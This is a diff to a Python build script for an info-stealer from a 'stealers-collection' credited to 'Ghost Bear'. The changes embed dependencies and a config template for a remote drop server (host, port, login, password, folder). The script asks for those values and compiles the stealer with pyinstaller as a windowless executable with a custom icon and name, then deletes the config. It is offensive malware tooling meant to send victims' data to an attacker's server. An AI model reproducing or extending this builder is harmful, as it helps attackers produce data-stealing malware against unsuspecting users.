@@ -4,6 +4,24 @@ import shutil
 import re
 from getpass import getpass
 
+requirments = '''
+pycryptodomex==3.9.9
+pywin32==227
+'''
+
+config = '''
+ADDRESS_HOST = "{ADDRESS_HOST}"
+ADDRESS_PORT = {ADDRESS_PORT}
+
+LOGIN = "{LOGIN}"
+PASSWORD = "{PASSWORD}"
+
+FOLDER = "{FOLDER}"
+
+LOG_LEVEL = {LOG_LEVEL}
+BUFFER_SIZE = {BUFFER_SIZE}
+'''
+
 header = r'''
 By Ghost Bear (https://github.com/Ghost-Bear)
  __         __
@@ -28,7 +46,13 @@ dir = os.path.split(__file__)[0] or "."
 old_dir = os.getcwd()
 os.chdir(dir)
 print("Checking installed modules...")
+with open("requirments.txt", "w") as f:
+	f.write(requirments)
 os.system(f"pip install -r requirments.txt")
+try:
+	os.remove("requirments.txt")
+except:
+	pass
 os.chdir("stealers-collection")
 
 if sys.platform.startswith('linux') or sys.platform == "darwin":
@@ -49,17 +73,16 @@ port = int(long_input("Server port: ", lambda x: re.fullmatch(r"[\d]+", x) and i
 login = input("Login: ")
 password = getpass("Password: ")
 folder = input("Folder to put data: ")
-with open("config.tmp.py", "r") as rf:
-	with open("config.py", "w") as wf:
-		wf.write(rf.read().format(
-			ADDRESS_HOST=hostname,
-			ADDRESS_PORT=port,
-			LOGIN=login,
-			PASSWORD=password,
-			FOLDER=folder,
-			LOG_LEVEL=0,
-			BUFFER_SIZE=1024
-		))
+with open("config.py", "w") as wf:
+	wf.write(config.format(
+		ADDRESS_HOST=hostname,
+		ADDRESS_PORT=port,
+		LOGIN=login,
+		PASSWORD=password,
+		FOLDER=folder,
+		LOG_LEVEL=0,
+		BUFFER_SIZE=1024
+	))
 print()
 print()
 print(" Compiled file info")
@@ -79,6 +102,10 @@ print(" Building stealer with pyinstaller:")
 os.system(f"pyinstaller -w -i \"{icon}\" -F --clean -y --distpath \"{outfolder}\" -n \"{outfile}\" main.py")
 try:
 	os.remove(f"{outfile}.spec")
+except:
+	pass
+try:
+	os.remove(f"config.py")
 except:
 	pass
 try:
